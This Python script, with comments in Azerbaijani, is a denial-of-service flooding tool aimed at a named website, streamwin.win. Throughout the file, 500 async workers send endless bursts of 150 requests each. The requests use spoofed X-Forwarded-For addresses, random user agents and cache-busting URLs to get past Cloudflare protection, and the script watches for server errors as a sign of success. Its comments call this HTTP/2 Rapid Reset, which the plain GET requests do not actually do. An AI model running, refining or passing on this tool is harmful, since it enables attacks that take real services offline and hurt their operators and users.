import asyncio
import httpx
import random
import time
import string

# --- HƏDƏF ---
TARGET_URL = "https://streamwin.win"
WORKERS = 500 # Asinxron olduğu üçün yüksək tuta bilərik
BATCH_SIZE = 150 # Hər dalğada 150 sürətli paket

def r_str(n=15):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

async def pulse_attack(worker_id, client):
    # Bu workerlər heç vaxt dayanmır və saniyədə minlərlə 'reset' kadrı göndərir
    while True:
        try:
            # Hər paketdə fərqli brauzer imzası və IP təqlidi
            headers = {
                "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/12{random.randint(4,6)}.0.0.0",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,254)}",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Connection": "keep-alive"
            }

            # Dinamik path hər müraciəti mütləq arxa serverə göndərməyə məcbur edir
            url = f"{TARGET_URL}/?v={time.time()}&id={r_str(32)}&s={r_str(60)}"
            
            # BURST MODE: Saniyədə yüzlərlə sorğunu heç bir gözləmə olmadan 'çırpırıq'
            tasks = []
            for _ in range(BATCH_SIZE):
                # HTTP/2 Rapid Reset effekti yaratmaq üçün asinxron tapşırıqlar
                tasks.append(client.get(url, headers=headers))
            
            # Bütün paketləri eyni saniyədə hədəfə burax!
            responses = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Əgər status 5xx gəlirsə, deməli müdafiə sarsılır
            error_count = len([r for r in responses if hasattr(r, 'status_code') and r.status_code >= 500])
            if error_count > 0:
                print(f"☢️  {error_count} Server Error aşkarlandı!", end="\r")

        except Exception:
            await asyncio.sleep(0.01)

async def main():
    print(f"🔥 PULSE-STRIKE MODE ACTIVATED: {TARGET_URL}")
    print("[!] Target: Cloudflare Protocol Layer. Deploying rapid resets...")
    
    # TCP hüdudlarını ləğv edən yüksək sürətli client
    limits = httpx.Limits(max_connections=None, max_keepalive_connections=None)
    
    async with httpx.AsyncClient(
        http2=True, # BU MÜTLƏQDİR - HTTP/2 protokolu olmadan Rapid Reset olmur
        verify=False, 
        limits=limits, 
        timeout=5.0 # Sürətli cavab almadığımız paketləri dərhal yenisi ilə əvəzləyirik
    ) as client:
        
        workers = [pulse_attack(i, client) for i in range(WORKERS)]
        await asyncio.gather(*workers)

if __name__ == "__main__":
    asyncio.run(main())
